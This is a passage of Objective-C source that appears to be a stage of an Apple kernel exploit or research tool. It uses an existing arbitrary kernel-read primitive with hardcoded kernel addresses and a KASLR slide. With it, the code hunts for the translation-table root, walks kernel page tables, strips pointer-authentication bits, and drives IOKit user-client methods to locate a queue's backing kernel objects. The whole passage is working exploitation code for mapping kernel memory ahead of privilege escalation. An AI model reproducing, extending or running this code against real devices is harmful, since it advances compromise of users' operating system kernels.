        // which.  11 candidates, one read each.
        uint64_t slots[11] = {
            0xfffffff007c392f0ull, 0xfffffff007cac108ull, 0xfffffff007c14e58ull,
            0xfffffff007c145f8ull, 0xfffffff007c38c90ull, 0xfffffff00b393a08ull,
            0xfffffff00b2d8828ull, 0xfffffff007c14e68ull, 0xfffffff007c14e70ull,
            0xfffffff00b284010ull, 0xfffffff007cac048ull,
        };
        const int slotCount = 11;
        NSMutableArray *tried = [NSMutableArray array];
        for (int i = 0; i < slotCount; i++) {
            uint64_t slotValue = CNDUatQRead64(&api, slots[i] + slide);
            NSMutableDictionary *row = [NSMutableDictionary dictionary];
            row[@"slot"] = @(slots[i]);
            row[@"value"] = @(slotValue);
            // Upper bound is the *observed* DRAM end when it is sane, never the
            // 1 TiB guess: past gPhysBase+gPhysSize the physmap is unmapped, so a
            // walk there faults.  With sizeSane false nothing is walked at all.
            uint64_t physEnd = sizeSane ? (gPhysBase + gPhysSize)
                                        : (gPhysBase + 0x1000000000ull);
            BOOL plausible = (slotValue >= gPhysBase && slotValue < physEnd &&
                              (slotValue & (CNDUatQPageSize - 1)) == 0);
            row[@"plausiblePaddr"] = @(plausible);
            row[@"walked"] = @(plausible && walkReady);
            if (plausible && walkReady) {
                uint64_t rootVa = CNDUatQPhysToKernel(&api, gVirtBase, gPhysBase,
                                                      gPhysSize, slotValue);
                // Look at the table before walking through it.  Four words, each
                // announced before the read: if the physmap model is wrong this is
                // the cheapest place to find out, and the report says where.
                NSMutableArray *peek = [NSMutableArray array];
                for (int w = 0; w < 4; w++) {
                    uint64_t addr = rootVa + (uint64_t)(w * 8);
                    CNDUatQPersist(report, @"trace.peek",
                                   @{ @"stage": @"peek-reading", @"address": @(addr),
                                      @"slot": @(slots[i]) });
                    uint64_t v = CNDUatQRead64(&api, addr);
                    [peek addObject:@{ @"address": @(addr), @"value": @(v) }];
                    CNDUatQPersist(report, @"trace.peek",
                                   @{ @"stage": @"peek-read", @"address": @(addr),
                                      @"slot": @(slots[i]), @"value": @(v) });
                }
                row[@"rootTablePeek"] = peek;
                CNDUatQWalkResult good = CNDUatQWalk(&api, gVirtBase, gPhysBase, gPhysSize,
                                                     rootVa, kbase + 0x1000,
                                                     report, @"good");
                CNDUatQWalkResult bad = CNDUatQWalk(&api, gVirtBase, gPhysBase, gPhysSize,
                                                    rootVa, CNDUAT_FAKE_VA,
                                                    report, @"bad");
                row[@"goodMapped"] = @(good.mapped);
                row[@"goodLevel"] = @(good.level);
                row[@"goodPaddr"] = @(good.paddr);
                row[@"badMapped"] = @(bad.mapped);
                // A valid kernel root maps the image at L3 and rejects the fake VA.
                if (good.mapped && good.level == 3 && !bad.mapped) {
                    row[@"accepted"] = @YES;
                    [tried addObject:row];
                    break;
                }
            }
            [tried addObject:row];
        }
        walkReport[@"rootCandidates"] = tried;
    }

    // Exercise the walk only when a root table paddr is actually available; with a
    // zero root the walk is meaningless and a bogus root must never be dereferenced.
    if (walkReady && cpuTtep != 0) {
        uint64_t rootVa = CNDUatQPhysToKernel(&api, gVirtBase, gPhysBase, gPhysSize,
                                              cpuTtep);
        if (rootVa != 0) {
            CNDUatQWalkResult good = CNDUatQWalk(&api, gVirtBase, gPhysBase, gPhysSize,
                                                 rootVa, kbase + 0x1000,
                                                 report, @"ttep.good");
            CNDUatQWalkResult bad = CNDUatQWalk(&api, gVirtBase, gPhysBase, gPhysSize,
                                                rootVa, CNDUAT_FAKE_VA,
                                                report, @"ttep.bad");
            walkReport[@"selfTest"] = @{
                @"rootTableVA": @(rootVa),
                @"goodMapped": @(good.mapped),
                @"goodLevel": @(good.level),
                @"goodPaddr": @(good.paddr),
                @"badMapped": @(bad.mapped),
            };
        }
    }
    report[@"walk"] = walkReport;
    CNDUatQPersist(report, @"walk", walkReport);

    // --- create a queue and find the table that indexes it ------------------
    uint64_t scalars[2] = { 0, 0 };
    uint64_t out[2] = { 0, 0 };
    uint32_t outCnt = 2;
    kern_return_t kr = IOConnectCallMethod(conn, 42, scalars, 2, NULL, 0, out, &outCnt,
                                            NULL, NULL);
    uint32_t qid = (uint32_t)out[0];
    report[@"queueCreateKR"] = @(kr);
    report[@"queueID"] = @(qid);

    uint8_t header[8] = { 0 };
    uint64_t submitScalar = qid;
    kern_return_t submitKr = IOConnectCallMethod(conn, 45, &submitScalar, 1, header,
                                                  sizeof(header), NULL, NULL, NULL,
                                                  NULL);
    report[@"submitCount0KR"] = @(submitKr);

    NSMutableDictionary *afterTables = [NSMutableDictionary dictionary];
    for (NSNumber *off in tableOffsets) {
        afterTables[[NSString stringWithFormat:@"0x%llx",
                     [off unsignedLongLongValue]]] =
            @(CNDUatQRead64(&api, staticsList[0] + [off unsignedLongLongValue]));
    }
    report[@"sharedMachineTablesAfter"] = afterTables;
    NSMutableArray *changed = [NSMutableArray array];
    for (NSNumber *off in tableOffsets) {
        NSString *key = [NSString stringWithFormat:@"0x%llx",
                         [off unsignedLongLongValue]];
        if (![beforeTables[key] isEqual:afterTables[key]]) {
            [changed addObject:key];
        }
    }
    report[@"sharedMachineTablesChanged"] = changed;

    // Candidate tables: any valid pointer field in the client window whose +0x10
    // slot array resolves qid to a valid object.  Bounded: one probe per pointer.
    NSMutableArray *candidates = [NSMutableArray array];
    if (qid != 0 && ptrMask != 0) {
        for (NSDictionary *f in fields) {
            uint64_t base = [f[@"ptr"] unsignedLongLongValue];
            if (base == 0) {
                continue;
            }
            uint64_t slotsRaw = CNDUatQRead64(&api, base + 0x10);
            uint64_t slots = CNDUatQUnsign(&api, slotsRaw, ptrMask);
            uint32_t count = (uint32_t)CNDUatQRead64(&api, base + 0x30);
            if (slots == 0 || qid >= count || count > 0x1000) {
                continue;
            }
            uint64_t slotRaw = CNDUatQRead64(&api, slots + (uint64_t)qid * 8);
            uint64_t slot = CNDUatQUnsign(&api, slotRaw, ptrMask);
            NSMutableDictionary *entry = [NSMutableDictionary dictionary];
            entry[@"fieldOffset"] = f[@"off"];
            entry[@"table"] = @(base);
            entry[@"slots"] = @(slots);
            entry[@"count"] = @(count);
            entry[@"slotForQID"] = @(slot);
            if (slot != 0) {
                entry[@"slot28"] = @(CNDUatQRead64(&api, slot + 0x28));
                entry[@"slot78"] = @(CNDUatQRead64(&api, slot + 0x78));
                entry[@"slotHead"] = CNDUatQHexList(&api, slot, 6);
                entry[@"bound"] = @((CNDUatQRead64(&api, slot + 0x28) != 0) &&
                                    (CNDUatQRead64(&api, slot + 0x78) != 0));
            }
            [candidates addObject:entry];
        }
    }
    report[@"queueTableCandidates"] = candidates;

    uint64_t destroyScalar = qid;
    (void)IOConnectCallMethod(conn, 43, &destroyScalar, 1, NULL, 0, NULL, NULL, NULL,
                              NULL);
    IOObjectRelease(conn);
    IOObjectRelease(svc);

    CNDUatQPersist(report, @"result", @"queue-diagnosed");
    if (completion) {
        completion(report);
    }
}
